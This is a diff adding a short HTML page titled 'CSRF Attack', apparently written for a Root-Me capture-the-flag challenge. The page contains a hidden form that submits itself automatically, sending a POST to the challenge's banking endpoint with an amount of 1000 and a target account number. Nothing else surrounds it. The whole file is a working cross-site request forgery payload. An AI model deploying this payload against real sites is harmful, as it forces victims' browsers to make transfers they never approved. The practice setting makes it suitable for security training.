@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/rich-club/" method="POST">
+        <input type="hidden" name="amount" value="1000">
+        <input type="hidden" name="targetAccount" value="123456789">
+    </form>
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
